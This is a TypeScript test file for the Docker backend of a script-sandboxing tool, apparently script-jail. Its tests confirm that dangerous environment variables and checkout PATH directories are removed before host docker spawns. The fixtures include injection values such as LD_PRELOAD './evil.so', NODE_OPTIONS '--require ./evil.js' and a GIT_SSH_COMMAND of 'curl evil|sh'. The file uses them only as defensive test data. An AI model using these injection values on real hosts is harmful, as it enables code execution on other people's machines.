import { afterEach, describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { delimiter, join } from 'node:path';

import {
  cleanupStagedDockerRepo,
  createDockerBackend,
  resolveDockerImageRef,
} from '../../../src/action/backend/docker.js';
import { BackendUnavailableError } from '../../../src/action/backend/types.js';
import type { BackendContext } from '../../../src/action/backend/types.js';

const PLACEHOLDER_X64 =
  'ghcr.io/brooooooklyn/script-jail-rootfs:ubuntu-24.04@sha256:PLACEHOLDER_SHA256_DOCKER_ROOTFS_UBUNTU_24_04_X64';
const PLACEHOLDER_ARM64 =
  'ghcr.io/brooooooklyn/script-jail-rootfs:ubuntu-24.04-arm64@sha256:PLACEHOLDER_SHA256_DOCKER_ROOTFS_UBUNTU_24_04_ARM64';
const REAL_REF =
  'ghcr.io/brooooooklyn/script-jail-rootfs:ubuntu-24.04@sha256:' + 'a'.repeat(64);

function makeCtx(over: {
  arch?: 'x64' | 'arm64';
  runnerImage?: string;
  selfTest?: boolean;
  dockerImages?: Record<string, Record<string, string>>;
}): BackendContext {
  return {
    selfTest: over.selfTest ?? false,
    arch: over.arch ?? 'x64',
    runnerImage: over.runnerImage ?? 'ubuntu-24.04',
    manifest: { dockerImages: over.dockerImages },
  } as unknown as BackendContext;
}

describe('resolveDockerImageRef', () => {
  it('downgrades a placeholder digest to the tag-only ref when allowTagFallback', () => {
    const r = resolveDockerImageRef(
      makeCtx({ dockerImages: { x64: { 'ubuntu-24.04': PLACEHOLDER_X64 } } }),
      { allowTagFallback: true },
    );
    expect(r.ref).toBe('ghcr.io/brooooooklyn/script-jail-rootfs:ubuntu-24.04');
    expect(r.warning).toMatch(/non-digest-pinned|placeholder/);
  });

  it('preserves the owner casing and arch suffix in the tag fallback', () => {
    const r = resolveDockerImageRef(
      makeCtx({ arch: 'arm64', dockerImages: { arm64: { 'ubuntu-24.04': PLACEHOLDER_ARM64 } } }),
      { allowTagFallback: true },
    );
    expect(r.ref).toBe('ghcr.io/brooooooklyn/script-jail-rootfs:ubuntu-24.04-arm64');
  });

  it('returns the placeholder ref verbatim (no warning) when allowTagFallback is false (Action default)', () => {
    const r = resolveDockerImageRef(
      makeCtx({ dockerImages: { x64: { 'ubuntu-24.04': PLACEHOLDER_X64 } } }),
    );
    expect(r.ref).toBe(PLACEHOLDER_X64);
    expect(r.warning).toBeUndefined();
  });

  it('returns a real digest ref verbatim even with allowTagFallback', () => {
    const r = resolveDockerImageRef(
      makeCtx({ dockerImages: { x64: { 'ubuntu-24.04': REAL_REF } } }),
      { allowTagFallback: true },
    );
    expect(r.ref).toBe(REAL_REF);
    expect(r.warning).toBeUndefined();
  });

  it('throws BackendUnavailableError when the manifest has no entry, regardless of the flag', () => {
    expect(() => resolveDockerImageRef(makeCtx({ dockerImages: {} }), { allowTagFallback: true }))
      .toThrow(BackendUnavailableError);
    expect(() =>
      resolveDockerImageRef(makeCtx({ dockerImages: { x64: { 'ubuntu-24.04': '  ' } } })),
    ).toThrow(BackendUnavailableError);
  });

  it('returns the local self-test tag without consulting the manifest', () => {
    expect(resolveDockerImageRef(makeCtx({ selfTest: true })).ref).toBe(
      'script-jail-rootfs:ubuntu-24.04',
    );
    expect(resolveDockerImageRef(makeCtx({ selfTest: true, arch: 'arm64' })).ref).toBe(
      'script-jail-rootfs:ubuntu-24.04-arm64',
    );
  });
});

describe('cleanupStagedDockerRepo', () => {
  it('restores host ownership before removing the staged repo', () => {
    const calls: string[] = [];
    const env = { PATH: '/usr/bin' };

    cleanupStagedDockerRepo({
      staged: {
        path: '/tmp/stage/work',
        cleanup: () => { calls.push('cleanup'); },
      },
      imageRef: 'script-jail-rootfs:ubuntu-24.04-arm64',
      env,
      hostOwner: { uid: 1001, gid: 121 },
      run: (cmd, args, opts) => {
        calls.push(`${cmd} ${args.join(' ')}`);
        expect(opts?.env).toBe(env);
      },
    });

    expect(calls).toEqual([
      [
        'docker',
        'run',
        '--rm',
        '-v',
        '/tmp/stage/work:/work',
        'script-jail-rootfs:ubuntu-24.04-arm64',
        '/bin/sh',
        '-lc',
        'find /work -xdev -exec chown -h 1001:121 {} +',
      ].join(' '),
      'cleanup',
    ]);
  });

  it('does not mask the audit result when ownership restore or cleanup fails', () => {
    const warnings: string[] = [];

    expect(() => cleanupStagedDockerRepo({
      staged: {
        path: '/tmp/stage/work',
        cleanup: () => { throw new Error('rm failed'); },
      },
      imageRef: 'script-jail-rootfs:ubuntu-24.04-arm64',
      stderr: { write: (s) => { warnings.push(s); } },
      hostOwner: { uid: 1001, gid: 121 },
      run: () => { throw new Error('chown failed'); },
    })).not.toThrow();

    expect(warnings.join('')).toContain('failed to restore staged repo ownership: chown failed');
    expect(warnings.join('')).toContain('failed to remove staged repo: rm failed');
  });

  it('skips ownership restore when the host uid/gid is unavailable', () => {
    const calls: string[] = [];

    cleanupStagedDockerRepo({
      staged: {
        path: '/tmp/stage/work',
        cleanup: () => { calls.push('cleanup'); },
      },
      imageRef: 'script-jail-rootfs:ubuntu-24.04-arm64',
      hostOwner: null,
      run: () => { calls.push('run'); },
    });

    expect(calls).toEqual(['cleanup']);
  });
});

// The HOST `docker` CLI is spawned by BARE NAME (resolved via PATH) for EVERY
// invocation BEFORE the audit trust gate (version probe, pull, `docker run`
// agent, teardown).  A checkout-prepended PATH dir or an inherited loader var
// (NODE_OPTIONS, LD_PRELOAD, …) would otherwise run/inject a PR-controlled
// `docker` on the host pre-trust.  These tests pin that the SAME
// `stripDangerousEnv` policy used by the host install + the bare backend is
// applied to the host `docker` spawn env (the in-container script env is a
// separate concern and is intentionally NOT sanitized).

const savedWorkspace = process.env['GITHUB_WORKSPACE'];

afterEach(() => {
  if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
  else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
});

describe('createDockerBackend — host docker spawns use the sanitized host env', () => {
  it('strips dangerous selectors and drops checkout PATH dirs from the availability-probe env', async () => {
    // A real checkout dir so realpath-based containment resolves (mac /tmp symlink).
    const checkout = mkdtempSync(join(tmpdir(), 'sj-docker-probe-'));
    const checkoutBin = join(checkout, 'bin');
    mkdirSync(checkoutBin);
    // `checkoutRoots()` reads the REAL process env (not deps.env), so a workflow
    // checkout must be visible there for its bin dir to be recognised + dropped.
    process.env['GITHUB_WORKSPACE'] = checkout;

    let probeCmd: string | undefined;
    let probeEnv: NodeJS.ProcessEnv | undefined;

    const backend = createDockerBackend({
      env: {
        GITHUB_WORKSPACE: checkout,
        // checkout-controlled dir prepended ahead of the system dirs
        PATH: `${checkoutBin}${delimiter}/usr/bin${delimiter}/bin`,
        // dangerous loader / config selectors that must never reach a host exec
        NODE_OPTIONS: '--require ./evil.js',
        LD_PRELOAD: './evil.so',
        DYLD_INSERT_LIBRARIES: './evil.dylib',
        GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
        NPM_CONFIG_SCRIPT_SHELL: './evil.sh',
        // legit env that MUST survive
        HOME: '/home/runner',
        HTTPS_PROXY: 'http://proxy:8080',
      },
      // capture the FIRST host docker spawn (the version probe) then fail it so
      // run() short-circuits before any staging / `docker run`.
      commandSucceeds: (cmd, _args, opts) => {
        if (probeCmd === undefined) {
          probeCmd = cmd;
          probeEnv = opts?.env;
        }
        return false;
      },
    });

    await expect(backend.run({} as BackendContext)).rejects.toBeInstanceOf(
      BackendUnavailableError,
    );

    expect(probeCmd).toBe('docker');
    expect(probeEnv).toBeDefined();
    const env = probeEnv as NodeJS.ProcessEnv;

    // dangerous selectors dropped
    expect(env['NODE_OPTIONS']).toBeUndefined();
    expect(env['LD_PRELOAD']).toBeUndefined();
    expect(env['DYLD_INSERT_LIBRARIES']).toBeUndefined();
    expect(env['GIT_SSH_COMMAND']).toBeUndefined();
    expect(env['NPM_CONFIG_SCRIPT_SHELL']).toBeUndefined();

    // PATH: checkout dir dropped, system dirs kept in order
    expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);

    // legit env preserved
    expect(env['HOME']).toBe('/home/runner');
    expect(env['HTTPS_PROXY']).toBe('http://proxy:8080');

    rmSync(checkout, { recursive: true, force: true });
  });

  it('uses the same sanitized env for the `docker run` agent and the teardown spawns', async () => {
    const checkout = mkdtempSync(join(tmpdir(), 'sj-docker-run-'));
    process.env['GITHUB_WORKSPACE'] = checkout;
    // A repo to stage + a SEPARATE scratch parent (staging cpSync's repoDir into
    // scratchDir, so they must not be the same tree).
    const repoDir = join(checkout, 'repo');
    mkdirSync(repoDir);
    const scratchDir = mkdtempSync(join(tmpdir(), 'sj-docker-scratch-'));

    let agentEnv: NodeJS.ProcessEnv | undefined;
    const runCmdEnvs: Array<NodeJS.ProcessEnv | undefined> = [];

    const backend = createDockerBackend({
      // selfTest so the image-inspect availability path is taken (no `docker pull`).
      env: {
        GITHUB_WORKSPACE: checkout,
        PATH: '/usr/bin',
        NODE_OPTIONS: '--require ./evil.js',
        HOME: '/home/runner',
      },
      // both the version probe and the image-inspect must pass so run() reaches
      // the `docker run` agent.
      commandSucceeds: () => true,
      // capture the agent spawn env, then resolve so the finally-block teardown
      // (rm -f + ownership chown) also runs through our seam.
      runAgentProcess: async (input) => {
        agentEnv = input.env;
        return { finalYaml: 'events: []\n', nonFatalWarnings: [] };
      },
      runCommand: (_cmd, _args, opts) => {
        runCmdEnvs.push(opts?.env);
      },
    });

    await backend.run({
      selfTest: true,
      arch: 'x64',
      runnerImage: 'ubuntu-24.04',
      repoDir,
      scratchDir,
      configPath: join(checkout, 'config.yml'),
      extraRepoOverlayFiles: [],
      manifest: {},
    } as unknown as BackendContext);

    // the `docker run` agent env is sanitized
    expect(agentEnv).toBeDefined();
    expect(agentEnv!['NODE_OPTIONS']).toBeUndefined();
    expect(agentEnv!['HOME']).toBe('/home/runner');

    // every teardown `docker` spawn (rm -f, ownership-restore chown) is sanitized
    expect(runCmdEnvs.length).toBeGreaterThan(0);
    for (const e of runCmdEnvs) {
      expect(e?.['NODE_OPTIONS']).toBeUndefined();
    }

    rmSync(checkout, { recursive: true, force: true });
    rmSync(scratchDir, { recursive: true, force: true });
  });

  it('#31 — delivers SCRIPT_JAIL_PM_FLAGS_PATH via container -e (literal argv), never an unquoted shell export', async () => {
    // Under install:true auditWorkDir == the host repoDir, which can contain spaces /
    // shell metachars (SCRIPT_JAIL_REPO_DIR / process.cwd() / GITHUB_WORKSPACE are
    // never validated).  An `export SCRIPT_JAIL_PM_FLAGS_PATH=${workDir}/...`
    // interpolated into `/bin/sh -lc` would split on a space ("export: not a valid
    // identifier" under `set -eu`, aborting the audit) or shell-evaluate a `$(...)`.
    // As a single `-e NAME=value` argv element the value stays literal regardless of
    // content (mirrors how bare/mac-bare pass it via the process env object).
    const checkout = mkdtempSync(join(tmpdir(), 'sj-docker-pmflags-'));
    process.env['GITHUB_WORKSPACE'] = checkout;
    const repoDir = join(checkout, 'repo');
    mkdirSync(repoDir);
    const scratchDir = mkdtempSync(join(tmpdir(), 'sj-docker-scratch-'));
    const workDirWithSpace = '/sandbox with space';

    let agentArgs: ReadonlyArray<string> | undefined;
    const backend = createDockerBackend({
      env: { GITHUB_WORKSPACE: checkout, PATH: '/usr/bin', HOME: '/home/runner' },
      commandSucceeds: () => true,
      runAgentProcess: async (input) => {
        agentArgs = input.args;
        return { finalYaml: 'events: []\n', nonFatalWarnings: [] };
      },
      runCommand: () => {},
    });

    await backend.run({
      selfTest: true,
      arch: 'x64',
      runnerImage: 'ubuntu-24.04',
      repoDir,
      scratchDir,
      configPath: join(checkout, 'config.yml'),
      extraRepoOverlayFiles: [],
      auditWorkDir: workDirWithSpace,
      manifest: {},
    } as unknown as BackendContext);

    expect(agentArgs).toBeDefined();
    const args = agentArgs as readonly string[];
    // The pm-flags path is one literal argv token, space intact, delivered as `-e <value>`.
    const expectedVal = `SCRIPT_JAIL_PM_FLAGS_PATH=${workDirWithSpace}/etc/script-jail/pm-flags.json`;
    const eIdx = args.indexOf(expectedVal);
    expect(eIdx).toBeGreaterThan(0);
    expect(args[eIdx - 1]).toBe('-e');
    // The bind-mount target is also the spaced workDir as a single argv token (safe).
    expect(args.some((a) => a.endsWith(`:${workDirWithSpace}`))).toBe(true);
    // The in-container `-lc` script must NOT export it (no unquoted interpolation),
    // and must not interpolate the spaced workDir into the shell at all.
    const lcIdx = args.indexOf('-lc');
    expect(lcIdx).toBeGreaterThan(0);
    const script = args[lcIdx + 1] ?? '';
    expect(script).not.toContain('export SCRIPT_JAIL_PM_FLAGS_PATH');
    expect(script).not.toContain(workDirWithSpace);

    rmSync(checkout, { recursive: true, force: true });
    rmSync(scratchDir, { recursive: true, force: true });
  });
});
